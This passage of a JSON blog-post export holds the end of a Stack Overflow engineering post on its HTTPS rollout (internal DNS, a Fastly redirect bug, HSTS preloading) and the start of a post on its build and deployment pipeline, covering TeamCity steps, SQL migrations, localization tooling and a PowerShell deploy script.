but compared to a sub 1ms connection inside the data center\u2026well yeah, it\u2019s slow. A lot of internal discussion ensued about the simplest way to solve this problem.  We could have made requests like internal.stackoverflow.com, but this would require substantial app changes to how the sites work (and potentially create conflicts later).  It would also have created an external leak of DNS for internal-only addresses (and created wildcard inheritance issues).  We could have made stackoverflow.com resolve different internally (this is known as split-horizon DNS), but that\u2019s both harder to debug and creates other issues like multi-datacenter \u201cwho-wins?\u201d scenarios. Ultimately, we ended up with a .internal suffix to all domains we had external DNS for.  For example, inside our network stackoverflow.com.internal resolves to an internal subnet on the back (DMZ) side of our load balancer. We did this for several reasons:  We can override and contain a top-level domain on our internal DNS servers (Active Directory) We can strip the .internal from the Host header as it passes through HAProxy back to a web application (the application side isn\u2019t even aware) If we need internal-to-DMZ SSL, we can do so with a very similar wildcard combination. Client API code is simple (if in this domain list, add .internal)  The client API code is done via a NuGet package/library called StackExchange.Network mostly written by Marc Gravell. We simply call it in a static way with every URL we\u2019re about to hit (so only in a few places, our utility fetch methods). It returns the \u201cinternalized\u201d URL, if there is one, or returns it untouched. This means any changes to logic here can be quickly deployed to all applications with a simple NuGet update. The call is simple enough: uri = SubstituteInternalUrl(uri);  Here\u2019s a concrete illustration for stackoverflow.com DNS behavior:  Fastly: 151.101.193.69, 151.101.129.69, 151.101.65.69, 151.101.1.69 Direct (public routers): 198.252.206.16 Internal: 10.7.3.16  Remember dnscontrol we mentioned earlier? That keeps all of this in sync.  Thanks to the JavaScript config/definitions, we can easily share all and simplify code. We match the last octet of all IPs (in all subnets, in all data centers), so with a few variables all the DNS entries both in AD and externally are aligned. This also means our HAProxy config is simpler as well, it boils down to this: stacklb::external::frontend_normal { 't1_http-in':   section_name    => 'http-in',   maxconn         => $t1_http_in_maxconn,   inputs          => {     \"${external_ip_base}.16:80\"  => [ 'name stackexchange' ],     \"${external_ip_base}.17:80\"  => [ 'name careers' ],     \"${external_ip_base}.18:80\"  => [ 'name openid' ],     \"${external_ip_base}.24:80\"  => [ 'name misc' ],  Overall, the API path is now faster and more reliable than before:  Origin app Local load balancer (DMZ side) Destination web server  A dozen problems solved, several hundred more to go. Mistakes: 301 Caching Something we didn\u2019t realize and should have tested is that when we started 301ing traffic from http:// to https:// for enabled sites, Fastly was caching the response. In Fastly, the default cache key doesn\u2019t take the protocol into account. I personally disagree with this behavior, since by default enabling 301 redirects at the origin will result in infinite redirects. The problem happens with this series of events:  A user visits a page on http:// They get redirected via a 301 to https:// Fastly caches that redirect Any user (including the one in #1 above) visits the same page on https:// Fastly serves the 301 to https://, even though you\u2019re already on it  And that\u2019s how we get an infinite redirect. To fix this, we turned off 301s, purged Fastly cache, and investigated. After fixing it via a hash change, we worked with Fastly support which recommended adding Fastly-SSL to the vary instead, like this:  sub vcl_fetch {    set beresp.http.Vary = if(beresp.http.Vary, beresp.http.Vary \",\", \"\") \"Fastly-SSL\";  In my opinion, this should be the default behavior. Mistakes: Help Center SNAFU Remember those help posts we had to fix? Help posts are mostly per-language with few being per-site, so it makes sense for them to be shared. To not duplicate a ton of code and storage structure for just this, we do them a little differently. We store the actual Post object (same as a question or answer) in meta.stackexchange.com, or whatever specific site the post is for. We store the resulting HelpPost in our central Sites database, which is just the baked HTML. In terms of mixed-content, we fixed the posts in the individual sites already, because they were the same posts are other things. Sweet! That was easy! After the original posts were fixed, we simply had to backfill the rebaked HTML into the Sites table. And that\u2019s where I left off a critical bit of code. The backfill looked at the current site (the ones the backfill was invoked on) rather than the site the original post came from. As an example, this resulted in a HelpPost from post 12345 on meta.stackechange.com being replaced with whatever was in post 12345 on stackoverflow.com. Sometimes it was an answer, sometimes a question, sometimes a tag wiki. This resulted in some very interesting help articles across the network. Here are some of the gems created. At least the commit to fix my mistake was simple enough:  \u2026and re-running the backfill fixed it all. Still, that was some very public \u201cfun\u201d. Sorry about that. Open Source Here are quick links to all the projects that resulted or improved from our HTTPS deployment. Hopefully these save the world some time:  BlackBox (Safely store secrets in source control) by Tom Limoncelli capnproto-net (UNSUPPORTED - Cap\u2019n Proto for .NET) by Marc Gravell DNSControl (Controlling multiple DNS providers) by Craig Peterson and Tom Limoncelli httpUnit (Integration tests for websites) by Matt Jibson and Tom Limoncelli Opserver (with support for Cloudflare DNS) by Nick Craver fastlyctl (Fastly API calls from Go) by Jason Harvey fastly-ratelimit (Rate limiting based on Fastly syslog traffic) by Jason Harvey  Next Steps We\u2019re not done. There\u2019s quite a bit left to do.  We need to fix mixed content on our chat domains like chat.stackoverflow.com (from user embedded images, etc.) We need to join (if we can) the Chrome HSTS preload list on all domains where possible. We need to evaluate HPKP and if we want to deploy it (it\u2019s pretty dangerous - currently leaning heavily towards \u201cno\u201d) We need to move chat to https:// We need to migrate all cookies over to secure-only We\u2019re awaiting HAProxy 1.8 (ETA is around September) which is slated to support HTTP/2 We need to utilize HTTP/2 pushes (I\u2019m discussing this with Fastly in June - they don\u2019t support cross-domain pushes yet) We need to move the https:// 301 out to the CDN/Proxy for performance (it was necessary to do it per-site as we rolled out)  HSTS Preloading HSTS stands for \u201cHTTP Strict Transport Security\u201d. OWASP has a great little write-up here. It\u2019s a fairly simple concept:  When you visit an https:// page, we send you a header like this: Strict-Transport-Security: max-age=31536000 For that duration (in seconds), your browser only visits that domain over https://  Even if you click a link that\u2019s http://, your browser goes directly to https://. It never goes through the http:// redirect that\u2019s likely also set up, it goes right for SSL/TLS. This prevents people intercepting the http:// (insecure) request and hijacking it. As an example, it could redirect you to https://stack<LooksLikeAnOButIsReallyCrazyUnicode>verflow.com, for which they may even have a proper SSL/TLS certificate. By never visiting there, you\u2019re safer. But that requires hitting the site once to get the header in the first place, right? Yep, that\u2019s right. So there\u2019s HSTS preloading, which is a list of domains that ships with all major browsers and how to preload them. Effectively, they get the directive to only visit https:// before the first visit. There\u2019s never any http:// communication once this is in place. Okay cool! So what\u2019s it take to get on that list? Here are the requirements:  Serve a valid certificate. Redirect from HTTP to HTTPS on the same host, if you are listening on port 80. Serve all subdomains over HTTPS.      In particular, you must support HTTPS for the www subdomain if a DNS record for that subdomain exists.   Serve an HSTS header on the base domain for HTTPS requests:      The max-age must be at least eighteen weeks (10886400 seconds). The includeSubDomains directive must be specified. The preload directive must be specified. If you are serving an additional redirect from your HTTPS site, that redirect must still have the HSTS header (rather than the page it redirects to).    That sounds good, right? We\u2019ve got all our active domains on HTTPS now, with valid certificates. Nope, we\u2019ve got a problem. Remember how we had meta.gaming.stackexchange.com for years? While it redirects to gaming.meta.stackexchange.com that redirect does not have a valid certificate. Using metas as an example, if we pushed includeSubDomains on our HSTS header, we would change every link on the internet pointing at the old domains from a working redirect into a landmine. Instead of landing on an https:// site (as they do today), they\u2019d get an invalid certificate error. Based on our traffic logs yesterday, we\u2019re still getting 80,000 hits a day just to the child meta domains for the 301s. A lot of this is web crawlers catching up (it takes quite a while), but a lot is also human traffic from blogs, bookmarks, etc. \u2026and some crawlers are just really stupid and never update their information based on a 301. You know who you are. And why are you still reading this? I fell asleep 3 times writing this damn thing. So what do we do? Do we set up several SAN certs with hundreds of domains on them and host that strictly for 301s piped through our infrastructure? It couldn\u2019t reasonably be done through Fastly without a higher cost (more IPs, more certs, etc.) Let\u2019s Encrypt is actually helpful here. Getting the cert would be low cost, if you ignore the engineering effort required to set it up and maintain it (since we don\u2019t use it today for reasons listed above). There\u2019s one more critical piece of archaeology here: our internal domain is ds.stackexchange.com. Why ds.? I\u2019m not sure. My assumption is we didn\u2019t know how to spell data center. This means includeSubDomains automatically includes every internal endpoint. Now, most of our things are https:// already, but making everything need HTTPS for even development from the first moment internally will cause some issues and delays. It\u2019s not that we wouldn\u2019t want https:// everywhere inside, but that\u2019s an entire project (mainly around certificate distribution and maintenance, as well as multi-level certificates) that you really don\u2019t want coupled. Why not just change the internal domain? Because we don\u2019t have a few spare months for a lateral move.  It requires a lot of time and coordination to do a move like that. For the moment, I will be ramping up the HSTS max-age duration slowly to 2 years across all Q&A sites without includeSubDomains. I\u2019m actually going to remove this setting from the code until needed, since it\u2019s so dangerous. Once we get all Q&A site header durations ramped up, I think we can work with Google to add them to the HSTS list without includeSubDomains, at least as a start. You can see on the current list that this does happen in rare circumstances. I hope they\u2019ll agree for securing Stack Overflow. Chat In order to enable Secure cookies (ones only sent over HTTPS) as fast as possible, we\u2019ll be redirecting chat (chat.stackoverflow.com, chat.stackexchange.com, and chat.meta.stackexchange.com) to https://. Chat relies on the cookie on the second-level domain like all the other Universal Login apps do, so if the cookies are only sent over https://, you can only be logged in over https://. There\u2019s more to think through on this, but making chat itself https:// with mixed-content while we solve those issues is still a net win. It allows us to secure the network fast and work on mixed-content in real-time chat afterwards. Look for this to happen in the next week or two. It\u2019s next on my list. Today So anyway, that\u2019s where we stand today and what we\u2019ve been up to the last 4 years. A lot of things came up with higher priority that pushed HTTPS back - this is very far from the only thing we\u2019ve been working on. That\u2019s life. The people working on this are the same ones that fight the fires we hope you never see. There are also far more people involved than mentioned here. I was narrowing the post to the complicated topics (otherwise it would have been long) that each took significant amounts of work, but many others at Stack Overflow and outside helped along the way. I know a lot of you will have many questions, concerns, complaints, and suggestions on how we can do things better. We more than welcome all of these things. We\u2019ll watch the comments below, our metas, Reddit, Hacker News, and Twitter this week and answer/help as much as we can. Thanks for your time, and you\u2019re crazy for reading all of this. <3", "content": "", "cover_photo_url": "https://nickcraver.com/blog/content/HTTPS-Websockets.png", "profile": 2, "updated_on": "2017-05-22T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 8031.0387411, "slug": "https-on-stack-overflow-the-end-of-a-long-road-145", "topics": [61]}}, {"model": "app.post", "pk": 146, "fields": {"title": "Stack Overflow: How We Do Deployment - 2016 Edition", "link": "https://nickcraver.com/blog/2016/05/03/stack-overflow-how-we-do-deployment-2016-edition/", "source": 1, "normalized_link": "nickcraver.com/blog/2016/05/03/stack-overflow-how-we-do-deployment-2016-edition", "summary": " This is #3 in a very long series of posts on Stack Overflow\u2019s architecture. Previous post (#2): Stack Overflow: The Hardware - 2016 Edition  We\u2019ve talked about Stack Overflow\u2019s architecture and the hardware behind it. The next most requested topic was Deployment. How do we get code a developer (or some random stranger) writes into production? Let\u2019s break it down. Keep in mind that we\u2019re talking about deploying Stack Overflow for the example, but most of our projects follow almost an identical pattern to deploy a website or a service.  I\u2019m going ahead and inserting a set of section links here because this post got a bit long with all of the bits that need an explanation:   Source & Context The Human Steps Branches Git On-Premises The Build System What\u2019s In The Build?  Steps 1 & 2: Migrations Step 3: Finding Moonspeak (Translation) Step 4: Translation Dump (JavaScript Edition) Step 5: MSBuild Step 6: Translation Dump (C# Edition) Step 7: Importing English Strings Step 8: Deploy Website Step 9: New Strings Hook   Tiers Database Migrations Localization/Translations (Moonspeak) Building Without Breaking Extra resources because I love you all      GitHub Gist (scripts) GitHub Gist (logs)    Source This is our starting point for this article. We have the Stack Overflow repository on a developer\u2019s machine. For the sake of discussing the process, let\u2019s say they added a column to a database table and the corresponding property to the C# object \u2014 that way we can dig into how database migrations work along the way. A Little Context We deploy roughly 25 times per day to development (our CI build) just for Stack Overflow Q&A. Other projects also push many times. We deploy to production about 5-10 times on a typical day. A deploy from first push to full deploy is under 9 minutes (2:15 for dev, 2:40 for meta, and 3:20 for all sites). We have roughly 15 people pushing to the repository used in this post. The repo contains the code for these applications: Stack Overflow (every single Q&A site), stackexchange.com (root domain only), Stack Snippets (for Stack Overflow JavaScript snippets), Stack Auth (for OAuth), sstatic.net (cookieless CDN domain), Stack Exchange API v2, Stack Exchange Mobile (iOS and Android API), Stack Server (Tag Engine and Elasticsearch indexing Windows service), and Socket Server (our WebSocket Windows service). The Human Steps When we\u2019re coding, if a database migration is involved then we have some extra steps. First, we check the chatroom (and confirm in the local repo) which SQL migration number is available next (we\u2019ll get to how this works). Each project with a database has their own migration folder and number. For this deploy, we\u2019re talking about the Q&A migrations folder, which applies to all Q&A databases. Here\u2019s what chat and the local repo look like before we get started:  And here\u2019s the local %Repo%\\StackOverflow.Migrations\\ folder:  You can see both in chat and locally that 726 was the last migration number taken. So we\u2019ll issue a \u201ctaking 727 - Putting JSON in SQL to see who it offends\u201d message in chat. This will claim the next migration so that we don\u2019t collide with someone else also doing a migration. We just type a chat message, a bot pins it. Fun fact: it also pins when I say \u201ctaking web 2 offline\u201d, but we think it\u2019s funny and refuse to fix it. Here\u2019s our little Pinbot trolling:  Now let\u2019s add some code \u2014 we\u2019ll keep it simple here: A \\StackOverflow\\Models\\User.cs diff:  + public string PreferencesJson { get; set; }  And our new \\StackOverflow.Migrations\\727 - Putting JSON in SQL to see who it offends.sql:  If dbo.fnColumnExists('Users', 'PreferencesJson') = 0 Begin     Alter Table Users Add PreferencesJson nvarchar(max); End  We\u2019ve tested the migration works by running it against our local Q&A database of choice in SSMS and that the code on top of it works. Before deploying though, we need to make sure it runs as a migration. For example, sometimes you may forget to put a GO separating something that must be the first or only operation in a batch such as creating a view. So, we test it in the runner. To do this, we run the migrate.local.bat you see in the screenshot above. The contents are simple:  ..\\Build\\Migrator-Fast --tier=local    --sites=\"Data Source=.;Initial Catalog=Sites.Database;Integrated Security=True\" %* PAUSE  Note: the migrator is a project, but we simply drop the .exe in the solutions using it, since that\u2019s the simplest and most portable thing that works. What does this migrator do? It hits our local copy of the Sites database. It contains a list of all the Q&A sites that developer runs locally and the migrator uses that list to connect and run all migrations against all databases, in Parallel. Here\u2019s what a run looks like on a simple install with a single Q&A database:  So far, so good. We have code and a migration that works and code that does\u2026some stuff (which isn\u2019t relevant to this process). Now it\u2019s time to take our little code baby and send it out into the world. It\u2019s time to fly little code, be freeeeee! Okay now that we\u2019re excited, the typical process is:  git add <files> (usually --all for small commits) git commit -m \"Migration 727: Putting JSON in SQL to see who it offends\" git pull --rebase git push  Note: we first check our team chatroom to see if anyone is in the middle of a deploy. Since our deployments are pretty quick, the chances of this aren\u2019t that big. But, given how often we deploy, collisions can and do happen. Then we yell at the designer responsible.  With respect to the Git commands above: if a command line works for you, use it. If a GUI works for you, use it. Use the best tooling for you and don\u2019t give a damn what anyone else thinks. The entire point of tooling from an ancient hammer to a modern Git install is to save time and effort of the user. Use whatever saves you the most time and effort. Unless it\u2019s Emacs, then consult a doctor immediately. Branches I didn\u2019t cover branches above because compared to many teams, we very rarely use them. Most commits are on master. Generally, we branch for only one of a few reasons:  A developer is new, and early on we want code reviews A developer is working on a big (or risky) feature and wants a one-off code review Several developers are working on a big feature  Other than the (generally rare) cases above, almost all commits are directly to master and deployed soon after. We don\u2019t like a big build queue. This encourages us to make small to medium size commits often and deploy often. It\u2019s just how we choose to operate. I\u2019m not recommending it for most teams or any teams for that matter. Do what works for you. This is simply what works for us. When we do branch, merging back in is always a topic people are interested in. In the vast majority of cases, we\u2019ll squash when merging into master so that rolling back the changes is straightforward. We also keep the original branch around a few days (for anything major) to ensure we don\u2019t need to reference what that specific change was about. That being said, we\u2019re practical. If a squash presents a ton of developer time investment, then we just eat the merge history and go on with our lives. Git On-Premises Alright, so our code is sent to the server-side repo. Which repo? We\u2019re currently using Gitlab for repositories. It\u2019s pretty much GitHub, hosted on-prem. If Gitlab pricing keeps getting crazier (note: I said \u201ccrazier\u201d, not \u201cmore expensive\u201d), we\u2019ll certainly re-evaluate GitHub Enterprise again. Why on-prem for Git hosting? For the sake of argument, let\u2019s say we used GitHub instead (we did evaluate this option). What\u2019s the difference? First, builds are slower. While GitHub\u2019s protocol implementation of Git is much faster, latency and bandwidth making the builds slower than pulling over 2x10Gb locally. But to be fair, GitHub is far faster than Gitlab at most operations (especially search and viewing large diffs). However, depending on GitHub (or any offsite third party) has a few critical downsides for us. The main downside is the dependency chain. We aren\u2019t just relying on GitHub servers to be online (their uptime is pretty good). We\u2019re relying on them to be online and being able to get to them. For that matter, we\u2019re also relying on all of our remote developers to be able to push code in the first place. That\u2019s a lot of switching, routing, fiber, and DDoS surface area in-between us and the bare essentials needed to build: code. We can drastically shorten that dependency chain by being on a local server. It also alleviates most security concerns we have with any sensitive code being on a third-party server. We have no inside knowledge of any GitHub security issues or anything like that, we\u2019re just extra careful with such things. Quite simply: if something doesn\u2019t need to leave your network, the best security involves it not leaving your network. All of that being said, our open source projects are hosted on GitHub and it works great. The critical ones are also mirrored internally on Gitlab for the same reasons as above. We have no issues with GitHub (they\u2019re awesome), only the dependency chain. For those unaware, even this website is running on GitHub pages\u2026so if you see a typo in this post, submit a PR. The Build System Once the code is in the repo, the continuous integration build takes over. This is just a fancy term for a build kicked off by a commit. For builds, we use TeamCity. The TeamCity server is actually on the same VM as Gitlab since neither is useful without the other and it makes TeamCity\u2019s polling for changes a fast and cheap operation. Fun fact: since Linux has no built-in DNS caching, most of the DNS queries are looking for\u2026itself. Oh wait, that\u2019s not a fun fact \u2014 it\u2019s actually a pain in the ass. As you may have heard, we like to keep things really simple. We have extra compute capacity on our web tier, so\u2026we use it. Builds for all of the websites run on agents right on the web tier itself, this means we have 11 build agents local to each data center. There are a few additional Windows and Linux build agents (for puppet, rpms, and internal applications) on other VMs, but they\u2019re not relevant to this deploy process. Like most CI builds, we simply poll the Git repo on an interval to see if there are changes. This repo is heavy hit, so we poll for changes every 15 seconds. We don\u2019t like waiting. Waiting sucks. Once a change is detected, the build server instructs an agent to run a build. Since our repos are large (we include dependencies like NuGet packages, though this is changing), we use what TeamCity calls agent-side checkout. This means the agent does the actual fetching of content directly from the repository, rather than the default of the web server doing the checkout and sending all of the source to the agent. On top of this, we\u2019re using Git mirrors. Mirrors maintain a full repository (one per repo) on the agent. This means the very first time the agent builds a given repository, it\u2019s a full git clone. However, every time after that it\u2019s just a git pull. Without this optimization, we\u2019re talking about a git clone --depth 1, which grabs the current file state and no history \u2014 just what we need for a build. With the very small delta we\u2019ve pushed above (like most commits) a git pull of only that delta will always beat the pants off grabbing all of files across the network. That first-build cost is a no-brainer tradeoff. As I said earlier, there are many projects in this repo (all connected), so we\u2019re really talking about several builds running each commit (5 total):  What\u2019s In The Build? Okay\u2026what\u2019s that build actually doing? Let\u2019s take a top level look and break it down. Here are the 9 build steps in our development/CI build:  And here\u2019s what the log of the build we triggered above looks like (you can see the full version in a gist here):  Steps 1 & 2: Migrations The first 2 steps are migrations. In development, we automatically migrate the \u201cSites\u201d database. This database is our central store that contains the master list of sites and other network-level items like the inbox. This same migration isn\u2019t automatic in production since \u201cshould this run be before or after code is deployed?\u201d is a 50/50 question. The second step is what we ran locally, just against dev. In dev, it\u2019s acceptable to be down for a second, but that still shouldn\u2019t happen. In the Meta build, we migrate all production databases. This means Stack Overflow\u2019s database gets new SQL bits minutes before code. We order deploys appropriately. The important part here is databases are always migrated before code is deployed. Database migrations are a topic all in themselves and something people have expressed interest in, so I detail them a bit more a little later in this post. Step 3: Finding Moonspeak (Translation) Due to the structure and limitations of the build process, we have to locate our Moonspeak tooling since we don\u2019t know the location for sure (it changes with each version due to the version being in the path). Okay, what\u2019s Moonspeak? Moonspeak is the codename for our localization tooling. Don\u2019t worry, we\u2019ll cover it in-depth later. The step itself is simple:  echo \"##teamcity[setParameter name='system.moonspeaktools'    value='$((get-childitem -directory packages/StackExchange.MoonSpeak.2*).FullName)\\tools']\"  It\u2019s just grabbing a directory path and setting the system.moonspeaktools TeamCity variable to the result. If you\u2019re curious about all of the various ways to interact with TeamCity\u2019s build, there\u2019s an article here. Step 4: Translation Dump (JavaScript Edition) In dev specifically, we run the dump of all of our need-to-be-translated strings in JavaScript for localization. Again the command is pretty simple:  %system.moonspeaktools%\\Jerome.exe extract    %system.translationsDumpPath%\\artifact-%build.number%-js.{0}.txt en;pt-br;mn-mn;ja;es;ru   \".\\StackOverflow\\Content\\Js\\*.js;.\\StackOverflow\\Content\\Js\\PartialJS\\**\\*.js\"  Phew, that was easy. I don\u2019t know why everyone hates localization. Just kidding, localization sucks here too. Now I don\u2019t want to dive too far into localization because that\u2019s a whole (very long) post on its own, but here are the translation basics: Strings are surrounded by _s() (regular string) or _m() (markdown) in code. We love _s() and _m(). It\u2019s almost identical for both JavaScript and C#. During the build, we extract these strings by analyzing the JavaScript (with AjaxMin) and C#/Razor (with a custom Roslyn-based build). We take these strings and stick them in files to use for the translators, our community team, and ultimately back into the build later. There\u2019s obviously way more going on - but those are the relevant bits. It\u2019s worth noting here that we\u2019re excited about the proposed Source Generators feature specced for a future Roslyn release. We hope in its final form we\u2019ll be able to re-write this portion of Moonspeak as a much simpler generator while still avoiding as many runtime allocations as possible. Step 5: MSBuild This is where most of the magic happens. It\u2019s a single step, but behind the scenes, we\u2019re doing unspeakable things to MSBuild that I\u2019m going to\u2026speak about, I guess. The full .msbuild file is in the earlier Gist. The most relevant section is the description of crazy:  THIS IS HOW WE ROLL:   CompileWeb - ReplaceConfigs - - - - - - BuildViews - - - - - - - - - - - - - PrepareStaticContent                      \\                                                            /|                       '- BundleJavaScript - TranslateJsContent - CompileNode   - '   NOTE:   since msbuild requires separate projects for parallel execution of targets, this build file is copied 2 times, the DefaultTargets of each copy is set to one of BuildViews, CompileNode or CompressJSContent.  thus the absence of the DependesOnTarget=\"ReplaceConfigs\" on those _call_ targets  While we maintain 1 copy of the file in the repo, during the build it actually forks into 2 parallel MSBuild processes. We simply copy the file, change the DefaultTargets, and kick it off in parallel here. The first process is building the ASP.NET MVC views with our custom Roslyn-based build in StackExchange.Precompilation, explained by Samo Prelog here. It\u2019s not only building the views but also plugging in localized strings for each language via switch statements. There\u2019s a hint at how that works a bit further down. We wrote this process for localization, but it turns out controlling the speed and batching of the view builds allows us to be much faster than aspnet_compiler used to be. Rumor is performance has gotten better there lately, though. The second process is the .less, .css, and .js compilation and minification which involves a few components. First up are the .jsbundle files. They are simple files that look like this example:  {   \"items\": [ \"full-anon.jsbundle\", \"PartialJS\\\\full\\\\*.js\", \"bounty.js\" ] }  These files are true to their name, they are simply concatenated bundles of files for use further on. This allows us to maintain JavaScript divided up nicely across many files but handle it as one file for the rest of the build. The same bundler code runs as an HTTP handler locally to combine on the fly for local development. This sharing allows us to mimic production as best we can. After bundling, we have regular old .js files with JavaScript in them. They have letters, numbers, and even some semicolons. They\u2019re delightful. After that, they go through the translator of doom. We think. No one really knows. It\u2019s black magic. Really what happens here isn\u2019t relevant, but we get a full.en.js, full.ru.js, full.pt.js, etc. with the appropriate translations plugged in. It\u2019s the same <filename>.<locale>.js pattern for every file. I\u2019ll do a deep-dive with Samo on the localization post (go vote it up if you\u2019re curious). After JavaScript translation completes (10-12 seconds), we move on to the Node.js piece of the build. Note: node is not installed on the build servers; we have everything needed inside the repo. Why do we use Node.js? Because it\u2019s the native platform for Less.js and UglifyJS. Once upon a time we used dotLess, but we got tired of maintaining the fork and went with a node build process for faster absorption of new versions. The node-compile.js is also in the Gist. It\u2019s a simple forking script that sets up n node worker processes to handle the hundreds of files we have (due to having hundreds of sites) with the main thread dishing out work. Files that are identical (e.g. the beta sites) are calculated once then cached, so we don\u2019t do the same work a hundred times. It also does things like add cache breakers on our SVG URLs based on a hash of their contents. Since we also serve the CSS with a cache breaker at the application level, we have a cache-breaker that changes from bottom to top, properly cache-breaking at the client when anything changes. The script can probably be vastly improved (and I\u2019d welcome it), it was just the simplest thing that worked and met our requirements when it was written and hasn\u2019t needed to change much since. Note: a (totally unintentional) benefit of the cache-breaker calculation has been that we never deploy an incorrect image path in CSS. That situation blows up because we can\u2019t find the file to calculate the hash\u2026and the build fails. The totality of node-compile\u2019s job is minifying the .js files (in place, not something like .min.js) and turning .less into .css. After that\u2019s done, MSBuild has produced all the output we need to run a fancy schmancy website. Or at least something like Stack Overflow. Note that we\u2019re slightly odd in that we share styles across many site themes, so we\u2019re transforming hundreds of .less files at once. That\u2019s the reason for spawning workers \u2014 the number spawned scales based on core count. Step 6: Translation Dump (C# Edition) This step we call the transmogulator. It copies all of the to-be-localized strings we use in C# and Razor inside _s() and _m() out so we have the total set to send to the translators. This isn\u2019t a direct extraction, it\u2019s a collection of some custom attributes added when we translated things during compilation in the previous step. This step is just a slightly more complicated version of what\u2019s happening in step #4 for JavaScript. We dump the files in raw .txt files for use later (and as a history of sorts). We also dump the overrides here, where we supply overrides directly on top of what our translators have translated. These are typically community fixes we want to upstream. I realize a lot of that doesn\u2019t make a ton of sense without going heavily into how the translation system works - which will be a topic for a future post. The basics are: we\u2019re dumping all the strings from our codebase so that people can translate them. When they are translated, they\u2019ll be available for step #5 above in the next build after. Here\u2019s the entire step:  %system.moonspeaktools%\\Transmogulator.exe .\\StackOverflow\\bin en;pt-br;mn-mn;ja;es;ru   \"%system.translationsDumpPath%\\artifact-%build.number%.{0}.txt\" MoonSpeak %system.moonspeaktools%\\OverrideExporter.exe export \"%system.translationConnectionString%\"   \"%system.translationsDumpPath%\"  Step 7: Importing English Strings One of the weird things to think about in localization is the simplest way to translate is to not special case English. To that end, here we are special casing it. Dammit, we already screwed up. But, by special casing it at build time, we prevent having to special case it later. Almost every string we put in would be correct in English, only needing the translation overrides for multiples and such (e.g. \u201c1 item\u201d vs \u201c2 items\u201d), so we want to immediately import anything added to the English result set so that it\u2019s ready for Stack Overflow as soon as it\u2019s built the first time (e.g. no delay on the translators for deploying a new feature). Ultimately, this step takes the text files created for English in Steps 4 and 6 and turns around and inserts them (into our translations database) for the English entries. This step also posts all new strings added to a special internal chatroom alerting our translators in all languages so that they can be translated ASAP. Though we don\u2019t want to delay builds and deploys on new strings (they may appear in English for a build and we\u2019re okay with that), we want to minimize it - so we have an alert pipe so to speak. Localization delays are binary: either you wait on all languages or you don\u2019t. We choose faster deploys. Here\u2019s the call for step 7:  %system.moonspeaktools%\\MoonSpeak.Importer.exe \"%system.translationConnectionString%\"   \"%system.translationsDumpPath%\\artifact-%build.number%.en.txt\" 9 false    \"https://teamcity/viewLog.html?buildId=%teamcity.build.id%&tab=buildChangesDiv\" %system.moonspeaktools%\\MoonSpeak.Importer.exe \"%system.translationConnectionString%\"   \"%system.translationsDumpPath%\\artifact-%build.number%-js.en.txt\" 9 false   \"https://teamcity/viewLog.html?buildId=%teamcity.build.id%&tab=buildChangesDiv\"  Step 8: Deploy Website Here\u2019s where all of our hard work pays off. Well, the build server\u2019s hard work really\u2026but we\u2019re taking credit. We have one goal here: take our built code and turn it into the active code on all target web servers. This is where you can get really complicated when you really just need to do something simple. What do you really need to perform to deploy updated code to a web server? Three things:  Stop the website Overwrite the files Start the website  That\u2019s it. That\u2019s all the major pieces. So let\u2019s get as close to the stupidest, simplest process as we can. Here\u2019s the call for that step, it\u2019s a PowerShell script we pre-deploy on all build agents (with a build) that very rarely changes. We use the same set of scripts for all IIS website deployments, even the Jekyll-based blog. Here are the arguments we pass to the WebsiteDeploy.ps1 script:  -HAProxyServers \"%deploy.HAProxy.Servers%\"  -HAProxyPort %deploy.HAProxy.Port% -Servers \"%deploy.ServerNames%\" -Backends \"%deploy.HAProxy.Backends%\"  -Site \"%deploy.WebsiteName%\" -Delay %deploy.HAProxy.Delay.IIS% -DelayBetween %deploy.HAProxy.Delay.BetweenServers% -WorkingDir \"%teamcity.build.workingDir%\\%deploy.WebsiteDirectory%\" -ExcludeFolders \"%deploy.RoboCopy.ExcludedFolders%\" -ExcludeFiles \"%deploy.RoboCopy.ExcludedFiles%\" -ContentSource \"%teamcity.build.workingDir%\\%deploy.contentSource%\" -ContentSStaticFolder \"%deploy.contentSStaticFolder%\"  I\u2019ve included script in the Gist here, with all the relevant functions from the profile included for completeness. The meat of the main script is here (lines shortened for fit below, but the complete version is in the Gist):  $ServerSession = Get-ServerSession $s if ($ServerSession -ne $null) {     Execute \"Server: $s\" {         HAProxyPost -Server $s -Action \"drain\"         # delay between taking a server out and killing the site, so current requests can finish         Delay -Delay $Delay         # kill website in IIS         ToggleSite -ServerSession $ServerSession -Action \"stop\" -Site $Site         # inform HAProxy this server is down, so we don't come back up immediately         HAProxyPost -Server $s -Action \"hdown\"         # robocopy!         CopyDirectory -Server $s -Source $WorkingDir -Destination \"\\\\$s\\...\"         # restart website in IIS         ToggleSite -ServerSession $ServerSession -Action \"start\" -Site $Site          # stick the site back in HAProxy rotation         HAProxyPost -Server $s -Action \"ready\"         # session cleanup         $ServerSession | Remove-PSSession     } }  The steps here are the minimal needed to gracefully update a website, informing the load balancer of what\u2019s happening and impacting users as little as possible. Here\u2019s what happens:  Tell HAProxy to stop sending new traffic Wait a few seconds for all current requests to finish Tell IIS to stop the site (Stop-Website) Tell HAProxy that this webserver is down (rather than waiting for it to detect) Copy the new code (robocopy) Tell IIS to start the new site (Start-Website) Tell HAProxy this website is ready to come back up  Note that HAProxy doesn\u2019t immediately bring the site back online. It will do so after 3 successful polls, this is a key difference between MAINT and DRAIN in HAProxy. MAINT -> READY assumes the server is instantly up. DRAIN -> READY assumes down. The former has a very nasty effect on ThreadPool growth waiting with the initial slam while things are spinning up. We repeat the above for all webservers in the build. There\u2019s also a slight pause between each server, all of which is tunable with TeamCity settings. Now the above is what happens for a single website. In reality, this step deploys twice. The reason why is race conditions. For the best client-side performance, our static assets have headers set to cache for 7 days. We break this cache only when it changes, not on every build. After all, you only need to fetch new CSS, SVGs, or JavaScript if they actually changed. Since cdn.sstatic.net comes from our web tier underneath, here\u2019s what could happen due to the nature of a rolling build: You hit ny-web01 and get a brand spanking new querystring for the new version. Your browser then hits our CDN at cdn.sstatic.net, which let\u2019s say hits ny-web07\u2026which has the old content. Oh crap, now we have old content cached with the new hash for a hell of a long time. That\u2019s no good, that\u2019s a hard reload to fix, after you purge the CDN. We avoid that by pre-deploying the static assets to another website in IIS specifically serving the CDN. This way sstatic.net gets the content in one rolling deploy, just before the new code issuing new hashes goes out. This means that there is a slight chance that someone will get new static content with an old hash (if they hit a CDN miss for a piece of content that actually changed this build). The big difference is that (rarely hit) problem fixes itself on a page reload, since the hash will change as soon as the new code is running a minute later. It\u2019s a much better direction to 